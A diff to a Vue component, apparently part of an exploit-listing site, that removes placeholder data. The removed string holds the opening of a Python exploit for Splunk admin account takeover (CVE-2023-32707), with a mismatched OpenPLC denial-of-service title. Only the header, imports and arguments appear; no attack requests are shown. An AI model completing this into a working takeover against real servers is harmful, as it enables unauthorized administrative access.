@@ -90,43 +90,10 @@ export default {
   name: "Details",
   created() {
     this.item = this.$route.params.item;
-    this.item.other_information = JSON.parse(this.item.other_information);
   },
   data() {
     return {
       item: null,
-      msg: "OpenPLC WebServer 3 - Denial of Service",
-      pythonCode: `
-#!/usr/bin/env python3
-#
-# Exploit Title: Splunk 9.0.5 - admin account take over
-# Author: [Redway Security](https://twitter.com/redwaysec))
-# Discovery: [Santiago Lopez](https://twitter.com/santi_lopezz99)
-
-#CVE: CVE-2023-32707
-
-# Vendor Description: A low-privilege user who holds a role that has the capability assigned
-# to it can escalate their privileges to that of the admin user by providing specially crafted web requests.
-#
-# Versions Affected: Splunk Enterprise **below** 9.0.5, 8.2.11, and 8.1.14.
-#
-import argparse
-import requests
-import random
-import string
-import base64
-# ignore warnings
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# Parse command-line arguments
-parser = argparse.ArgumentParser(description='Splunk Authentication')
-parser.add_argument('--host', required=True, help='Splunk host or IP address')
-parser.add_argument('--username', required=True, help='Splunk username')
-parser.add_argument('--password', required=True, help='Splunk password')
-parser.add_argument('--target-user', required=True, help='Target user')
-parser.add_argument('--force-exploit', action='store_true',
-help='Force exploit')`,
     };
   },
 };
